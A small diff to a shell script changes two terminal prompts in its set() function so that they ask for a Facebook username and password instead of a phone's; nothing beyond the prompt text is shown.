@@ -51,10 +51,10 @@ login() {
 
 set() {
     clear
-    echo -e "\e[32mEnter Username of phone:\e[0m"
+    echo -e "\e[32mEnter Username you'r Facebook:\e[0m"
     read -p "Username: " user
 
-    echo -e "\e[32mEnter Password of phone:\e[0m"
+    echo -e "\e[32mEnter Password you'r Facebook:\e[0m"
     read -sp "Password: " pas
     echo
 
